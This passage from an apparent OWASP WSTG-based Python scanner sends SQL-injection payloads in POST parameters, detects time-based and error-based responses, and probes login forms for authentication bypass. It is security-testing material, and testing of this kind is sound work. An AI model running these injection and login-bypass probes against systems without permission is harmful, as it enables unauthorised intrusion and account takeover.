                        test_data[param_name] = payload
                        
                        try:
                            start = time.time()
                            if content_type == "application/json":
                                resp = await client.post(url, json=test_data, headers={"Content-Type": "application/json"})
                            else:
                                resp = await client.post(url, data=test_data)
                            elapsed = time.time() - start
                            
                            # Time-based SQLi detection
                            if attack_type == "time_based" and elapsed > 4.5:
                                findings.append({
                                    "parameter": param_name,
                                    "payload": payload,
                                    "type": "time_based_sqli_post",
                                    "method": "POST",
                                    "evidence": f"Response delayed {elapsed:.2f}s",
                                    "severity": "critical"
                                })
                            
                            # Error-based SQLi detection
                            error_patterns = [
                                r"sql syntax", r"mysql_fetch", r"pg_query", r"sqlite3\.OperationalError",
                                r"ORA-\d+", r"Microsoft SQL Server", r"Unclosed quotation"
                            ]
                            import re
                            for pattern in error_patterns:
                                if re.search(pattern, resp.text, re.IGNORECASE):
                                    findings.append({
                                        "parameter": param_name,
                                        "payload": payload,
                                        "type": "error_based_sqli_post",
                                        "method": "POST",
                                        "evidence": resp.text[:200],
                                        "severity": "critical"
                                    })
                                    break
                        except Exception:
                            pass
            else:
                # Try common login forms
                for payload, attack_type in sql_payloads[:4]:
                    try:
                        test_json = {"email": payload, "password": "test"}
                        resp = await client.post(url, json=test_json)
                        if "token" in resp.text.lower() or "authenticated" in resp.text.lower():
                            findings.append({
                                "parameter": "email/username",
                                "payload": payload,
                                "type": "auth_bypass_sqli",
                                "method": "POST",
                                "evidence": "Authentication bypassed",
                                "severity": "critical"
                            })
                    except Exception:
                        pass
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings,
                    "message": f"Found {len(findings)} POST SQLi vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No POST SQLi found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# MODULE COMPLETE: 20 comprehensive input validation tools implemented
# Coverage: WSTG 4.7.1 - 4.7.19 (All major tests covered) + 7 tools (5 GET + 2 POST)
# ============================================================================

